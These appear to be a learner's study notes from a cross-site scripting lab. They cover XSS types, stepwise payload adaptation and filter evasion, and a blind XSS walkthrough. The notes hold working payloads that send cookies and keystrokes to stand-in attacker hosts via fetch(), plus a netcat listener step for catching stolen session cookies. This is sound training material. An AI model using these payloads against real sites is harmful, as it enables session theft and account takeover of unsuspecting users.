### Table of contents
- [[#Intro]]
- [[#Reflected XSS]]
- [[#Stored XSS]]
- [[#DOM Based XSS]]
- [[#Blind XSS]]
- [[#Payload Perfection]]
- [[#Blind XSS practical]]

___
### Intro
[[#Table of contents|Back to the top]]

**Cross-Site Scripting**: malicious **JS** script injected in web application for other users to execute

Payload
- **Intention**: what I want JS to do
- **Modification**: changes in the code so it executes to adapt to each scenario

Intentions
- **Proof Of Concept**: simple proof XSS works
  `<script>alert('XSS');</script>`
- **Session Stealing**: token, cookie
  `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- **Key Logger**
  `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- **Business Logic**: specific to application. For instance, for an app in which the account is linked to an email address --> change email attacker's email so they can change the password
  `<script>user.changeEmail('attacker@hacker.thm');</script>`

___
### Reflected XSS
[[#Table of contents|Back to the top]]

User input in HTTP request is included in webpage without validation

Example: website displays error message when input is invalid
`https://website.thm/?error=Invalid Input Detected`
--> `https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>`

Ways to test for reflected XSS
- **Parameter** in URL query string (`?var=...`)
- **URL** file path
- HTTP **headers** (unlikely)

___
### Stored XSS
[[#Table of contents|Back to the top]]

Payload stored on webapp and gets run when other users use webapp, usually in a database

Ways to test: test when it seems data is stored and then shown to other users
- **Comments** on a blog
- User **profile information**
- Website **Listings**

Exploit fields in which developers thought the input limitation is sufficient (drop down age field but instead manually send the request with malicious payload attempt)

___
### DOM Based XSS
[[#Table of contents|Back to the top]]

Document Object Model: programming interface for HTML and XML documents, represents page so programs can change document structure, style, content

HTML DOM
![[Pasted image 20251126143606.png]]
[Learn more](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html)

JS execution happens directly in browser without any new page being loaded or data being submitted to backend code
Execution happens when website JS code acts on input or user interaction

Example:
Website JS gets content from **`window.location.hash`** parameter and writes on page in currently viewed section
Contents of hash aren't checked for malicious code --> possible injection

Ways to test: requires good JS knowledge, look for parts in code that access certain variables that attacker can have control over (e.g. **`window.location.x`** parameters)
Check how they are handled: written on webpage's DOM or passed to unsafe JS methods such as **`eval()`**

___
### Blind XSS
[[#Table of contents|Back to the top]]

Similar to [[#Stored XSS]]: payload gets stored on webapp for other user to view but can't see payload working or be able to test

Example:
Webapp has contact form, message content isn't checked
--> could reveal staff portal URL (where they handle the tickets)

Ways to test: ensure payload has a **call back** (know when code is being executed)
Popular tool: [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) --> automatically capture cookies, URLs, page contents, ...

___
### Payload Perfection
[[#Table of contents|Back to the top]]

*Inspect the page source in order to adapt the payload*

1. LVL 1
- Form doesn't modify anything from input:
  ```HTML
  <p>Hello, input</p>
  ```
--> Payload can be sent as is: `<script>alert('Hacked!');</script>`

2. LVL 2
- Input gets put inside an attribute:
```HTML
<p>Hello, <input value="input"><p>
```
--> Adapt payload to close `<input>` tag: `"><script>alert('Hacked!');</script>` (added **`">`**)

3. LVL 3
- Input uses `<textarea>` tag:
```HTML
<p>Hello, <textarea>input</textarea></p>
```
--> Adapt payload to close `<textarea>`tag: `</textarea><script>alert('Hacked!');</script>`

4. LVL 4
- Input is reflected in JS code:
```JS
<script>
	document.getElementByClassName('name')[0].innetHTML='input';
</script>
```
--> Adapt payload to close placeholder and start new command: `';alert('Hacked!');//` and comment anything after it

5. LVL 5
- Looks like LVL 1 but removes the word "script"
--> Add the word "script" inside the word "script": `<sscriptcript>alert('Hacked!');</sscriptcript>`

6. LVL 6
- Looks like LVL 2 but removes `<` and `>`:
```HTML
<div>
	<p>Your picture</p>
	<img src="input">
</div>
```
Closing the placeholder and the tag with `">` doesn't work --> take advantage of attribute `onload` (executes command when image is loaded) of `<img>` tag: `/images/cat.jpg" onload="alert('Hacked!');`

___
### Blind XSS practical
[[#Table of contents|Back to the top]]

1. Create an account
2. Create a support ticket
3. View source page to see how input from support ticket is reflected
```HTML
<div><label>Ticket Subject:</label>test subject</div>
<div><label>Ticket Created:</label> 26/11/2025 14:20</div>
<div><label>Ticket Contents:</label></div>
<div><textarea class="form-control">test content</textarea></div>
```
4. Proof Of Concept escaping the `<textarea>` tag: `</textarea>test`
5. Set up listening server (Netcat): `nc -nlvp 9001`
6. Build payload
`</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
- `URL_OR_IP`: attacker IP
- `POST_NUMBER`: listening port (9001)
7. Send Payload through support form, receive cookie and decode cookie